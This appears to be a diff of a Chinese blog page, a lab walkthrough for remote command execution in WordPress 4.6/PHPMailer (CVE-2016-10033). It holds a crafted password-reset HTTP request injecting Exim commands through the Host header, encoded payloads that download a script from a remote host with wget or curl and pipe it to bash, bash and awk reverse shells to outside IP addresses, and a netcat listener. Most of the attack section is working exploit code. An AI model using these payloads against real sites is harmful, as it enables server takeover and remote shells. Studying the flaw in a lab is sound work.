@@ -599,7 +599,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    2.1k
                 </div>
                 
 
@@ -637,12 +637,12 @@
 <li>影响版本： WordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18</li>
 </ul>
 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>参考： <a target="_blank" rel="noopener" href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html">WordPress-Exploit-4-6</a></p>
-<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>编译及运行测试环境</p>
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>编译及运行测试环境</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker-compost build
 $ codker-compost up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>由于Mysql初始化需要一段时间，所以请等待。成功运行后，访问 <code>http://your-ip:8080/</code> 打开站点，初始化管理员用户名和密码后即可使用（数据库等已经配置好，且不会自动更新）。</p>
-<h3 id="测试与EXP使用"><a href="#测试与EXP使用" class="headerlink" title="测试与EXP使用"></a>测试与EXP使用</h3><p>发送如下数据包，可见 <code>/tmp/success</code> 已经成功创建：</p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>发送如下数据包，可见 <code>/tmp/success</code> 已经成功创建：</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /wp-login.php?action<span class="token operator">=</span>lostpassword HTTP/1.1
 Host: target<span class="token punctuation">(</span>any -froot@localhost -be <span class="token variable">${run{${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>bin<span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>touch<span class="token variable">${substr{10}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$tod_log</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>tmp<span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>success<span class="token punctuation">}</span><span class="token punctuation">}</span> null<span class="token punctuation">)</span>
 Connection: close
@@ -664,7 +664,7 @@ wp-submit<span class="token operator">=</span>Get+New+Password<span class="token
 <p>为了解决这些坑，漏洞作者想出了，利用 <code>${substr{0}{1}{$spool_directory}}</code> 代替 <code>/</code> ，用 <code>${substr{10}{1}{$tod_log}}</code> 代替空格的方法。</p>
 <p>但是还是有很多字符不能用，所以我们需要将待执行的命令放到第三方网站中，然后通过 <code>curl -o /tmp/rce example.com/shell.sh</code> 的方法先将他下载到 <code>/tmp</code> 目录中，再去执行。</p>
 </blockquote>
-<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>所以，总体来说利用过程如下：</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>所以，总体来说利用过程如下：</p>
 <ul>
 <li>编写反弹shell的exp，放到某个网页里。有如下要求：<ul>
 <li>整个url的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径</li>
@@ -734,18 +734,22 @@ wp-submit<span class="token operator">=</span>Get+New+Password<span class="token
 <blockquote>
 <p>测试下载反弹shell：<br>注意：</p>
 <ul>
+<li>本地启用http服务</li>
 <li>远程 URL 中不能有 <code>http://</code></li>
 <li>所有字母必须小写</li>
 </ul>
 </blockquote>
-<p>远程反弹shell脚本内容(104.168.162.186:1337/a.txt)：<br> <code>nohup bash -i &gt;/dev/tcp/104.168.162.186/1337 0&lt;&amp;1 2&gt;&amp;1) &amp;</code> </p>
-<p>payload：<br> <code>aa(any -froot@localhost -be ${run{/usr/bin/wget --output-document /tmp/rce 104.168.162.186/a.txt}} null)</code><br>执行反弹shell：<br> <code>aa(any -froot@localhost -be ${run{/bin/bash /tmp/rce}} null)</code> </p>
+<p>远程反弹shell脚本内容(192.168.102.128/reverse_shell)：<br> </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'BEGIN {s = "/inet/tcp/0/192.168.102.128/19111"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print <span class="token variable">$0</span> |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p>
 <blockquote>
-<p>两个payload转换过来就是</p>
-<p> <code>aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce${substr{10}{1}{$tod_log}}104.168.162.186${substr{0}{1}{$spool_directory}}a.txt}} null)</code> </p>
-<p> <code>aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}bash${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}rce}} null)</code> </p>
+<p>Awk弹shell 具有长联优势<br>长联：客户端一直保持向服务端反弹shell的状态<br>(即使服务端断开连接不用在受害者主机中再次执行命令直接nc接shell即可)</p>
 </blockquote>
-<p>在反弹主机上用nc监听1337端口，分别按顺序提交payload即可获取到反弹shell<br> <code>nc -nvv -l -p 1337</code> </p>
+<p>payload：<br> <code>aa(any -froot@localhost -be ${run{/usr/bin/curl --output-document /tmp/rce 192.168.102.128/reverse_shell|bash}} null)</code><br>执行反弹shell：<br> <code>aa(any -froot@localhost -be ${run{/bin/bash /tmp/rce}} null)</code> </p>
+<p>两个payload转换过来就是</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aa<span class="token punctuation">(</span>any -froot@localhost -be <span class="token variable">${run{${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>usr<span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>bin<span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>wget<span class="token variable">${substr{10}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$tod_log</span><span class="token punctuation">}</span><span class="token punctuation">}</span>--output-document<span class="token variable">${substr{10}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$tod_log</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>tmp<span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>rce<span class="token variable">${substr{10}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$tod_log</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token number">192.168</span>.102.128<span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>reverse_shell<span class="token operator">|</span>bash<span class="token punctuation">}</span><span class="token punctuation">}</span> null<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aa<span class="token punctuation">(</span>any -froot@localhost -be <span class="token variable">${run{${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>bin<span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>bash<span class="token variable">${substr{10}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$tod_log</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>tmp<span class="token variable">${substr{0}</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token variable">$spool_directory</span><span class="token punctuation">}</span><span class="token punctuation">}</span>rce<span class="token punctuation">}</span><span class="token punctuation">}</span> null<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在反弹主机上用nc监听19111端口，分别按顺序提交payload即可获取到反弹shell<br> <code>nc -nvv -l -p 19111</code> </p>
 <p><img src="/medias/images/20210621105536.png" alt="images"><br><img src="/medias/images/20210416193745964.png" alt="images"></p>
 <blockquote>
 <p>wordpress使用phpmailer组件进行重置密码邮件的发送，而phpmailer &lt; 5.2.18之前的版本存在命令注入漏洞<br>阅读<a target="_blank" rel="noopener" href="https://paper.seebug.org/161/">seebug分析链接</a></p>
@@ -832,7 +836,7 @@ wp-submit<span class="token operator">=</span>Get+New+Password<span class="token
 
 
 
-<span class="token assign-left variable">rev_host</span><span class="token operator">=</span><span class="token string">"104.168.162.186"</span>
+<span class="token assign-left variable">rev_host</span><span class="token operator">=</span><span class="token string">"192.168.102.128"</span>
 
 <span class="token keyword">function</span> <span class="token function-name function">prep_host_header</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token assign-left variable">cmd</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span>
@@ -968,7 +972,7 @@ prep_host_header <span class="token string">"<span class="token variable">$cmd</
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/06/21/wordpress-4.6-ren-yi-ming-ling-zhi-xing-lou-dong/">http://example.com/2021/06/21/wordpress-4.6-ren-yi-ming-ling-zhi-xing-lou-dong/</a>
+                    <a href="https://haowz.github.io/2021/06/21/wordpress-4.6-ren-yi-ming-ling-zhi-xing-lou-dong/">https://haowz.github.io/2021/06/21/wordpress-4.6-ren-yi-ming-ling-zhi-xing-lou-dong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1233,7 +1237,7 @@ prep_host_header <span class="token string">"<span class="token variable">$cmd</
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/20/hello/">
+                <a href="/2021/06/21/hello/">
                     <div class="card-image">
                         
                         
@@ -1250,7 +1254,7 @@ prep_host_header <span class="token string">"<span class="token variable">$cmd</
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-21
                             </span>
                         <span class="publish-author">
                             
@@ -1510,7 +1514,7 @@ prep_host_header <span class="token string">"<span class="token variable">$cmd</
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">2.2k</span>
+                        class="white-color">2.3k</span>
             
             
             
